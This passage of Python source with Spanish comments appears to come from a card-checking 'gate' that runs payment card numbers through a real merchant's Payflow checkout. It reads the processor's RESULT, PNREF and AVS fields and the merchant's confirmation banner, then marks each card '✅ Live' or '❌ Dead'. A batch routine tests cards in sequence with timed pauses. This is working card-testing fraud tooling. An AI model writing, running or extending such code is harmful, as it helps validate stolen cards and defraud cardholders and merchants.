            # Veredicto Payflow: el recibo trae RESULT + RESPMSG + PNREF y un
            # redirectForm de vuelta al comercio. Pase o no la compra, ambas
            # sacan del checkout (medido). El approved se confirma con el
            # banner verde "Success / You have paid successfully" + el
            # "Order Summary / Thank you for your order!" (captura del usuario).
            result = parseX(source, 'name="RESULT" value="', '"') or ""
            respmsg = parseX(source, 'name="RESPMSG" value="', '"/>')
            pnref = parseX(source, 'name="PNREF" value="', '"') or ""
            avsdata = parseX(source, 'name="AVSDATA" value="', '"/>')
            detail = f"RESULT={result} {respmsg or ''} | PNREF={pnref} | AVS: {avsdata or ''}".strip()

            # Mandar el redirectForm de vuelta al comercio y confirmar el
            # approved con el banner verde (no con el RESULT aislado).
            # Diccionario vivo: todo texto nuevo (banner rojo incluido) se
            # guarda en data/atlas_texts.jsonl para armar el catálogo sin
            # capturas. Si no hay banner verde ni rojo conocido -> Dead
            # honesto con el detalle crudo, nunca "error".
            confirmed = False
            back_body = ""
            try:
                m_act = re.search(
                    r'<form[^>]*name="redirectForm"[^>]*action="([^"]+)"',
                    source, re.I,
                )
                if m_act:
                    back_url = html.unescape(m_act.group(1))
                    back_fields = {}
                    for m_in in re.finditer(
                        r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"',
                        source, re.I,
                    ):
                        back_fields[m_in.group(1)] = html.unescape(m_in.group(2))
                    r12 = seccion.post(
                        back_url, data=back_fields, timeout=40,
                        allow_redirects=True,
                    )
                    back_body = r12.text or ""
                    _debug_save_receipt(
                        "s12_back", r12.status_code, back_body
                    )
                    low12 = back_body.lower()
                    if (
                        "you have paid successfully" in low12
                        or "thank you for your order" in low12
                    ):
                        confirmed = True
            except Exception as exc:
                logger.debug("No se pudo confirmar el redirectForm: %s", exc)

            # --- diccionario vivo de textos del comercio ---
            try:
                _learn_atlas_text(back_body or source, result, respmsg)
            except Exception:
                pass

            if result.strip() == "0" or confirmed:
                return {
                    "status": "✅ Live",
                    "message": f"Tarjeta aprobada. {detail}",
                    "time": tiempo,
                }
            if "RESPMSG" in source or result:
                return {
                    "status": "❌ Dead",
                    "message": detail or "Tarjeta declinada por el procesador.",
                    "time": tiempo,
                }
            return _err(tiempo)

        except Exception as e:
            logger.exception("Atlas gate: excepción no controlada")
            tiempo = f"{float((datetime.now() - inicio).total_seconds()):0.2f}"
            return _err(tiempo)

    return await loop.run_in_executor(None, _run)


async def atlas_check_multiple(
    cards: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    """Verifica un lote de tarjetas en secuencia, con callback por tarjeta."""
    clean = [c.strip() for c in cards if c.strip()][:10]
    results: List[Dict[str, str]] = []
    for i, card in enumerate(clean):
        result = await atlas_check(card, user_id)
        results.append(result)
        if callback:
            try:
                await callback(i, result, card, user_id or 0)
            except Exception:
                logger.exception("Error en callback de Atlas mass")
        if i < len(clean) - 1:
            await asyncio.sleep(5)
    return results
